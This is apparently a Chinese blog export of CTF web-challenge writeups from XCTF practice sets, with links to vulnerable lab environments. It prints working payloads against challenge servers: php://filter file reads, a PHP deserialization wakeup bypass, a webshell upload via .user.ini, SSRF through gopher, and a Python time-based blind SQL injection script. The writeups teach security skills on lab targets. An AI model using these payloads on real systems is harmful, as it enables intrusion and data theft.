<p><a href="https://www.likecs.com/show-415281.html">pikachu</a></p>
<p><a href="https://blog.csdn.net/weixin_52501704/article/details/123590785">xss-platform平台的入门搭建</a></p>
<p><a href="https://ranjuan.cn/xss-platform-test/">XSS测试平台xss-platform搭建</a></p>
<p><a href="https://blog.csdn.net/Flamingo1998/article/details/125199522">DVWA靶场环境搭建</a></p>
<p><a href="https://blog.csdn.net/weixin_45744814/article/details/120185420">vulhub</a></p>
<p><a href="https://www.freebuf.com/sectool/165062.html">分享一个好用的漏洞环境：Vulhub</a></p>
<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><p><a href="http://www.360doc.com/content/20/0312/03/7563309_898550725.shtml">中国移动光猫超级管理员账号密码汇总</a></p>
]]></content>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title>WRITEUP</title>
    <url>/2022/08/30/WRITEUP/</url>
    <content><![CDATA[<center>CTF的Writeup</center>

<span id="more"></span>

<h1 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p><a href="https://www.nowcoder.com/">牛客网 - 互联网求职神器和备考学习平台</a></p>
<p><a href="https://leetcode.cn/">力扣-LeetCode</a></p>
<p><a href="https://www.luogu.com.cn/">洛谷</a></p>
<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p><a href="https://adworld.xctf.org.cn/">攻防世界</a></p>
<p><a href="https://ctf.bugku.com/">BugkuCTF - 练习平台</a></p>
<p><a href="https://ctf.pediy.com/itembank.htm">看雪题库</a></p>
<p><a href="https://www.bilibili.com/read/cv12315967">愿安全人不在踩坑，一年多以来网络安全的学习经验</a></p>
<p><a href="https://buuoj.cn/">BUUCTF在线评测</a></p>
<p><a href="https://www.ctfhub.com/#/index">CTFHub</a></p>
<h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h2 id="CAT-x2F-XCTF-4th-WHCTF-2017-4"><a href="#CAT-x2F-XCTF-4th-WHCTF-2017-4" class="headerlink" title="CAT&#x2F;XCTF 4th-WHCTF-2017(4)"></a>CAT&#x2F;XCTF 4th-WHCTF-2017(4)</h2><p><a href="https://www.cnblogs.com/-mo-/p/11572267.html">writeup</a><br>最开始看到这熟悉的界面，还以为是简单的命令注入，输入<code>127.0.0.1</code>发现的确是ping命令，但是当输入<code>127.0.0.1 &amp; dir</code>的时候报错，显示Invalid URL。然后就懵逼了，毫无下手之地。<br>查看大佬们的writeup之后发现，可以使用宽字符注入，即<code>url=%df</code>，然后他就会爆出html代码，把代码复制打开，就是报错原因和相关信息。<br>(django报错页面，将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。)<br><img data-src="https://img-blog.csdnimg.cn/32794d1fbf7a4d5fa3807a4b943b2c89.png" alt="在这里插入图片描述"><br>在这里可以看到pyhton path，第一行就是项目路径。<br><img data-src="https://img-blog.csdnimg.cn/98e09c135f234a44a70fec8f1db7c094.png" alt="在这里插入图片描述"><br>这里没看懂，不过大概意思是可以使用<code>@</code>读取文件内容<br>这里前面还有一个字典fuzz的操作，@没有被过滤<br><img data-src="https://img-blog.csdnimg.cn/f203f026631b4bf6b8dbf869970dca7b.png" alt="在这里插入图片描述"></p>
<p>django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。<br>django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。即<code>/opt/api/api/settings.py</code><br>打开<code>url=@/opt/api/api/settings.py</code>也出现了一段html代码，复制打开可以看到<code>Name：/opt/api/database.sqlite3</code><br><img data-src="https://img-blog.csdnimg.cn/adfc5a5c6e96428dbfa68ce0df702a06.png" alt="在这里插入图片描述"><br>直接打开<code>url=@/opt/api/database.sqlite3</code>，直接搜索flag或ctf<br>搜索ctf获得结果<code>WHCTF&#123;yoooo_Such_A_G00D_@&#125;</code></p>
<h2 id="Training-WWW-Robots-1"><a href="#Training-WWW-Robots-1" class="headerlink" title="Training-WWW-Robots(1)"></a>Training-WWW-Robots(1)</h2><p>这是一个学习robots文件的题，直接在网址后加<code>/robots.txt</code>或者使用<a href="http://s.tool.chinaz.com/robots/">站长工具</a>进行robots检测。可以看到</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>

<p><img data-src="https://img-blog.csdnimg.cn/c8804b9ef0d3464e93b9004c80c18aaf.png" alt="在这里插入图片描述"><br>那就直接打开<code>/fl0g.php</code>，就能看到flag<br><code>cyberpeace&#123;b03432652f32469133918d7f56ca2cf1&#125;</code></p>
<h2 id="PHP2-1"><a href="#PHP2-1" class="headerlink" title="PHP2(1)"></a>PHP2(1)</h2><p>你能登录这个网站吗？<br>没有思路，can can need<br>看了writeup才发现我忘了可以进行后台地址爆破<br>使用御剑或者dirsearch<br>(因为题目提示了php，那就只选php就行)<br><img data-src="https://img-blog.csdnimg.cn/9a1916437f544bfbbbb4c06b2e7215bc.png" alt="在这里插入图片描述"><br>dirsearch -u URL<br><img data-src="https://img-blog.csdnimg.cn/40366e096b32463bba7d09d4d821d9cf.png" alt="在这里插入图片描述"><br>这两个死活没用，看了一下，人家能爆出来<code>index.phps</code>？原来是自己加的。。<br>打开出现下述代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>两次比较，第一次是<code>===</code><br>全等于操作过程如下：<br>1.判断全等于操作符2边的数据类型是否相同 如果不相同，则返回false<br>2.判断全等于操作符2边的值是否相等，如果 不相等，则返回false<br>3.最后将上面2步的操作进行与操作。返回与操作的结果。<br>第二次是<code>==</code>，只比较值（强制进行数据类型转换）</p>
<p>所以我们传入的必须是经过两次url编码（get也会解码）后的<code>admin</code>（任意数量字符），比如传入<code>admin</code>-&gt;<code>%61dmin</code>-&gt;<code>%2561dmin</code>（这里需要传入的地址可以是根目录或者&#x2F;index.php，但是不能是&#x2F;index.phps，因为它只是源码）</p>
<p>urlencode将需要转码的字符转为16进制，然后从右到左，取4位(不足4位直接处理)，每2位做一位，前面加上%，编码成%XY格式。<br>但是这里直接使用在线工具对admin编码是不可以的，因为它不会对字符和数字进行编码，我们需要直接转成16进制，然后加上%<br><a href="http://www.ku51.net/ox2str/">字符转16进制</a></p>
<p>然后就能看到flag<code>cyberpeace&#123;2babf104e185faee3b5700e452be462d&#125;</code></p>
<h2 id="unserialize3-1"><a href="#unserialize3-1" class="headerlink" title="unserialize3(1)"></a>unserialize3(1)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//这里本来题目没有大括号</span></span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p>看到<code>?code=</code>我猜到应该是用get传参，其它就不会了<br>看了<a href="https://blog.csdn.net/qq_45552960/article/details/102664372">大佬的writeup</a>大概的思路是把xctf这个类序列化后的结果用get传过去，同时还要跳过__wakeup()函数</p>
<p>__wakeup()，执行unserialize()时，先会调用这个函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$peak</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();<span class="comment">//使用new运算符来实例化该类（xctf）的对象为peak</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$peak</span>));<span class="comment">//输出被序列化的对象（peak）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>序列化的结果是<br><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>大概的意思是长度4的object xctf包含一个只有1个参数的数组<br>里面有一个长度4的string flag的值为长度3的string 111</p>
<p>那要怎样才能跳过__wakeup()函数呢？</p>
<p>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
<p>将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即<br><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>然后用上面说的get方式访问，就能看到flag<br><code>cyberpeace&#123;dc66a5c3f1fa0cb3bd5517df3fa8dc8c&#125;</code></p>
<h2 id="ics-06-x2F-XCTF-4th-CyberEarth-1"><a href="#ics-06-x2F-XCTF-4th-CyberEarth-1" class="headerlink" title="ics-06&#x2F;XCTF 4th-CyberEarth(1)"></a>ics-06&#x2F;XCTF 4th-CyberEarth(1)</h2><p>点开是一个恢弘的界面（贴图）<br><img data-src="https://img-blog.csdnimg.cn/b658f9640764436888232d139902424a.png" alt="在这里插入图片描述"><br>看到这么多选项，我是没想着一个个试着点的，但是论快捷还是一个个点。<br>也可以查看元素搜href，不过还是点方便。<br>点击报表中心会转到另一个界面，让你选日期玩，不过怎么选都没用<br>不过可以注意到url有一个get传参。<br>尝试使用sql注入好像不太行，看了<a href="https://blog.csdn.net/Mr_helloword/article/details/107946683">别人的writeup</a>才知道要爆破。。（这是我没想到的)<br>这里burpsuite中payload type要选择Numbers，设置从1到5000，step为1<br>当id为2333时长度不一样<br>在response可以看到flag</p>
<p><code>cyberpeace&#123;53736b5e0bffa8fa26d2b5987f74fa52&#125;</code></p>
<h2 id="view-source-x2F-Cyberpeace-n3k0-1"><a href="#view-source-x2F-Cyberpeace-n3k0-1" class="headerlink" title="view_source&#x2F;Cyberpeace-n3k0(1)"></a>view_source&#x2F;Cyberpeace-n3k0(1)</h2><p>这里好像鼠标右键被禁用了，但是很少用右键打开检查。。<br>ctrl+u查看源码或者F12查看元素，得到<br>flag</p>
<p><code>cyberpeace&#123;41e995b7ee379f3bd0eedc31a829dee9&#125;</code></p>
<h2 id="get-post-x2F-Cyberpeace-n3k0-1"><a href="#get-post-x2F-Cyberpeace-n3k0-1" class="headerlink" title="get_post&#x2F;Cyberpeace-n3k0(1)"></a>get_post&#x2F;Cyberpeace-n3k0(1)</h2><p>这里跟着它的要求先get提交a&#x3D;1，然后post提交b&#x3D;2就能获得flag<br>这里post可以用HackBar插件，当然抓包在下面添加post也行<br><code>cyberpeace&#123;8e329e962b4c0ce9dd4149dca6a6e733&#125;</code></p>
<h2 id="robots-x2F-Cyberpeace-n3k0-1"><a href="#robots-x2F-Cyberpeace-n3k0-1" class="headerlink" title="robots&#x2F;Cyberpeace-n3k0(1)"></a>robots&#x2F;Cyberpeace-n3k0(1)</h2><p>访问<code>/robots.txt</code>可以看到<br><img data-src="https://img-blog.csdnimg.cn/b0028b67a9864f8399566c57fb7118bf.png" alt="在这里插入图片描述"><br>这里的Disallow参数代表禁止遵守robots规则的搜索引擎爬取<br>直接访问，可以获得flag<br><code>cyberpeace&#123;49643cd3a8ce8917ff5c2f0a022f198a&#125;</code></p>
<h2 id="backup-x2F-Cyberpeace-n3k0-1"><a href="#backup-x2F-Cyberpeace-n3k0-1" class="headerlink" title="backup&#x2F;Cyberpeace-n3k0(1)"></a>backup&#x2F;Cyberpeace-n3k0(1)</h2><p>访问<code>/index.php</code>没反应<br>常见的备份文件后缀名：</p>
<pre><code>.bak
.git
.svn
.swp
.~
.bash_history
.bkf
</code></pre>
<p>因为题目名是backup，所以后缀名有可能是bak<br>使用dirsearch试一下<br><img data-src="https://img-blog.csdnimg.cn/a49504cfeb64446b8b745e3d36a16904.png" alt="在这里插入图片描述"><br>访问<code>/index.php.bak</code>，会下载一个<code>index.php.bak</code>文件，记事本打开得到flag<br><code>Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</code></p>
<h2 id="cookie-x2F-Cyberpeace-n3k0-1"><a href="#cookie-x2F-Cyberpeace-n3k0-1" class="headerlink" title="cookie&#x2F;Cyberpeace-n3k0(1)"></a>cookie&#x2F;Cyberpeace-n3k0(1)</h2><p><img data-src="https://img-blog.csdnimg.cn/9cdf3d06a28f4523b413b02591a83b24.png" alt="在这里插入图片描述"><br>访问<code>/cookie.php</code>，提示<code>See the http response</code><br>在响应标头里可以看到flag<br><img data-src="https://img-blog.csdnimg.cn/d1f631048fce4688a5c3ae62844a825c.png" alt="在这里插入图片描述"><br><code>cyberpeace&#123;8d6cfbe3f601cd12e4e2c6f1b0807c11&#125;</code></p>
<h2 id="disabled-button-x2F-Cyberpeace-n3k0-1"><a href="#disabled-button-x2F-Cyberpeace-n3k0-1" class="headerlink" title="disabled_button&#x2F;Cyberpeace-n3k0(1)"></a>disabled_button&#x2F;Cyberpeace-n3k0(1)</h2><p><img data-src="https://img-blog.csdnimg.cn/15a204b429e141ae90e92c9b0d241f36.png" alt="在这里插入图片描述"><br>去掉disable，点击获得flag<br>或者可以post传<code>auth=flag</code><br><code>cyberpeace&#123;ce6972b365ff4502f2c0928f9d833569&#125;</code></p>
<h2 id="weak-auth-x2F-Cyberpeace-n3k0-1"><a href="#weak-auth-x2F-Cyberpeace-n3k0-1" class="headerlink" title="weak_auth&#x2F;Cyberpeace-n3k0(1)"></a>weak_auth&#x2F;Cyberpeace-n3k0(1)</h2><p>随便输了个<code>admin</code>，<code>password</code>试了一下，提示<br><img data-src="https://img-blog.csdnimg.cn/308edda2d480475e9326799a4a93287b.png" alt="在这里插入图片描述"><br>又随便输了个<code>1</code>，<code>1</code>试了下，提示<code>please login as admin</code><br>那就只用爆破密码就行<br>把top1w导入，本来以为很久，结果第一个就出了<br><img data-src="https://img-blog.csdnimg.cn/e029a1a201014975b0a3477ee2cc5983.png" alt="在这里插入图片描述"></p>
<p><img data-src="https://img-blog.csdnimg.cn/efd1e0f22b964a19b02242164c558e1f.png" alt="在这里插入图片描述"><br>获得flag<code>cyberpeace&#123;80b17eb4a68b7fcff023f3f9b8e7c371&#125;</code></p>
<h2 id="simple-php-x2F-Cyberpeace-n3k0-1"><a href="#simple-php-x2F-Cyberpeace-n3k0-1" class="headerlink" title="simple_php&#x2F;Cyberpeace-n3k0(1)"></a>simple_php&#x2F;Cyberpeace-n3k0(1)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">﻿<span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php中有两种比较符号</p>
<blockquote>
<p>&#x3D;&#x3D;&#x3D; 会同时比较字符串的值和类型<br>&#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较</p>
</blockquote>
<p>get传入a和b<br>is_numeric() 函数用于检测变量是否为数字或数字字符串<br>要求a&#x3D;&#x3D;0且a不为空，a&#x3D;”0”或者a&#x3D;0a或者a&#x3D;任意字符串<br>要求b不为数字或数字字符串且大于1234，传入b&#x3D;1235a<br>所以传入<code>?a=0a&amp;b=1235a</code>就能获得完整flag<br><code>Cyberpeace&#123;647E37C7627CC3E4019EC69324F66C7C&#125;</code></p>
<h2 id="baby-web-1"><a href="#baby-web-1" class="headerlink" title="baby_web(1)"></a>baby_web(1)</h2><p>dirsearch发现如下<br><img data-src="https://img-blog.csdnimg.cn/06d915f2ec264647a03b7b702ea168d1.png" alt="在这里插入图片描述"><br>访问<code>index.php</code>会重定向到1.php，这里没有思路了。<br>看writeup发现需要使用burpsuite抓包<br>当它重定向时，send to repeater，修改GET &#x2F;index.php，send<br>提示Flag is hidden!</p>
<p>在响应头可以看到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018145224981.png" alt="image-20221018145224981"><br><code>flag&#123;very_baby_web&#125;</code></p>
<h2 id="inget-x2F-宜兴网信办-1"><a href="#inget-x2F-宜兴网信办-1" class="headerlink" title="inget&#x2F;宜兴网信办(1)"></a>inget&#x2F;宜兴网信办(1)</h2><p>看题目抓不着头脑，结果看writeup说这是一个SQL注入的题<br>查了下inget，<code>投入；输入；输入过程</code>，okok（我看提示bypass想歪了）<br>bypass<code>绕过; 避开</code><br>使用sqlmap得到flag<br><code>cyberpeace&#123;d59b2f9aadab6159052039f0edeefe3a&#125;</code></p>
<h2 id="easyupload-x2F-CTF-1"><a href="#easyupload-x2F-CTF-1" class="headerlink" title="easyupload&#x2F;CTF(1)"></a>easyupload&#x2F;CTF(1)</h2><p>看名字就知道，上传一句话木马，但是提示<code>Your file looks wicked</code><br>上传正常图片可以，那就上传图片马<br>但是上传图片马也失败了<br>看了一下writeup，发现内容不能包含php，所以需要用短标签<br>可以使用图片马或者php前加<code>GIF89a</code><br><img data-src="https://img-blog.csdnimg.cn/70400023b924450d9646f23c31af199e.png" alt="在这里插入图片描述"><br>还需要上传<code>.user.ini</code>文件，上传时抓包修改<code>Content-Type: image/gif</code><br><img data-src="https://img-blog.csdnimg.cn/6451989056424d63bbffa2d9341321d3.png" alt="在这里插入图片描述"><br>通过.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。<br>提交后会显示路径，访问<code>/uploads/index.php</code><br><strong>但是它怎么知道这个目录下有php文件呢？</strong><br>这里需要访问的是index.php，通过<code>.user.ini</code>配置让它包含1.png<br>在蚁剑中可以看到flag在根目录<br><code>cyberpeace&#123;9aac6bc58d51e4ee318aee88578bd973&#125;</code></p>
<h2 id="fileinclude-x2F-宜兴网信办-1"><a href="#fileinclude-x2F-宜兴网信办-1" class="headerlink" title="fileinclude&#x2F;宜兴网信办(1)"></a>fileinclude&#x2F;宜兴网信办(1)</h2><p>提示<br><img data-src="https://img-blog.csdnimg.cn/52b5cb00ae2347b1bafd9abbcc760dbb.png" alt="在这里插入图片描述"><br>@include表示包含并运行指定文件的内容<br>file_get_contents() 把整个文件读入一个字符串中。</p>
<p>用hackbar传一个cookie：language&#x3D;chinese，提示变化<br>传flag的话，界面变为空白<br>看了下writeup，需要传入的cookie为：<br><code>Cookie: language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</code></p>
<blockquote>
<p>php:&#x2F;&#x2F;filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p>
</blockquote>
<p>然后能看到经base64加密后的字符串<br><code>PD9waHANCiRmbGFnPSJjeWJlcnBlYWNlezhhMzllNTc1N2U4ZDAzNTQyZjVlMzRlZjY1YzE1Nzk3fSI7DQo/Pg==</code><br>解密后获得flag<br><code>cyberpeace&#123;8a39e5757e8d03542f5e34ef65c15797&#125;</code></p>
<h2 id="very-easy-sql-x2F-CTF-1"><a href="#very-easy-sql-x2F-CTF-1" class="headerlink" title="*very_easy_sql&#x2F;CTF(1)"></a>*very_easy_sql&#x2F;CTF(1)</h2><p>点一下submit，发现它根本没有跳转，查看元素，发现果然是假表单<br><img data-src="https://img-blog.csdnimg.cn/ce4b966849e540499a4a972b1c2ed1a4.png" alt="在这里插入图片描述"><br>提示use.php，那就让访问<code>use.php</code></p>
<p>提示<code>url you want to curl</code></p>
<blockquote>
<p>cURL是一个利用URL语法在命令行下工作的文件传输工具</p>
</blockquote>
<p>输入flag好像没反应，看了一眼url，这不会也是sql注入吧</p>
<p>sqlmap level1好像不行</p>
<p>看了眼writeup，这是一个ssrf题，知识盲区。</p>
<p><a href="https://blog.csdn.net/qq_60115503/article/details/124407499">gopher协议</a></p>
<p>URL编码：替换回车换行为*%0d%0a*</p>
<p>在kali的终端执行</p>
<p><code>curl http://61.147.171.105:57675/use.php?url=gopher://127.0.0.1:80/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aCookie%3A%20PHPSESSID%3D1f546328759632456215236845122365%3B%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%2024%250d%250a%250d%250auname%3Dadmin%2526passwd%3Dadmin</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:57675/use.php?url=gopher://127.0.0.1:80/_POST /index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: localhost:80</span><br><span class="line">Cookie: PHPSESSID=1f546328759632456215236845122365;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 24</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=admin</span><br></pre></td></tr></table></figure>

<p>响应包</p>
<p><img data-src="/../images/WRITEUP/image-20220919101805654.png" alt="image-20220919101805654"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this_is_your_cookie=YWRtaW4%3D</span><br></pre></td></tr></table></figure>

<p>所以这是一个Cookie注入</p>
<p><code>gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;+bs+&quot;%3B%250d%250a</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_GET /index.php HTTP/1.1</span><br><span class="line">Host: localhost:80</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: this_is_your_cookie=&quot; bs &quot;;</span><br><span class="line"></span><br><span class="line">bs为注入的字段</span><br><span class="line">bs = str(base64.b64encode(poc.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;)</span><br></pre></td></tr></table></figure>

<p>构建下列POC，实现cookie延时注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://61.147.171.105:57675/use.php?url=&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		poc=<span class="string">&quot;&#x27;) union select 1,2,if(ascii( substr((select * from flag),&quot;</span>+<span class="built_in">str</span>(pos)+<span class="string">&quot;,1) )=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,sleep(2),1) # &quot;</span></span><br><span class="line">		bs = <span class="built_in">str</span>(base64.b64encode(poc.encode(<span class="string">&quot;utf-8&quot;</span>)), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">		final_poc=<span class="string">&quot;gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;</span>+bs+<span class="string">&quot;%3B%250d%250a&quot;</span></span><br><span class="line">		t1=time.time()</span><br><span class="line">		res=requests.get(url+final_poc)</span><br><span class="line">		t2=time.time()</span><br><span class="line">		<span class="keyword">if</span>(t2-t1&gt;<span class="number">2</span>):</span><br><span class="line">			<span class="built_in">print</span>(t2-t1)</span><br><span class="line">			flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><code>cyberpeace&#123;c2329560bc8e2346a72681101d023249&#125;</code></p>
<h2 id="fileclude-x2F-CTF-1"><a href="#fileclude-x2F-CTF-1" class="headerlink" title="fileclude&#x2F;CTF(1)"></a>fileclude&#x2F;CTF(1)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致意思是get传file1和file2，file2的内容是<code>hello ctf</code><br>file1使用php:&#x2F;&#x2F;filter伪协议来读取源代码<br>file2可以用php:&#x2F;&#x2F;input来绕过<br><code>/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</code><br>这里需要使用burpsite抓包修改get为POST，并且POST传”hello ctf”<br>得到base64加密后的<br><code>PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXtmMTRiMDE4MzJlZDliMThiMzM4MGRiYzE3NzE1NjgyOX0=</code><br>解密，获得flag<br><code>cyberpeace&#123;f14b01832ed9b18b3380dbc177156829&#125;</code></p>
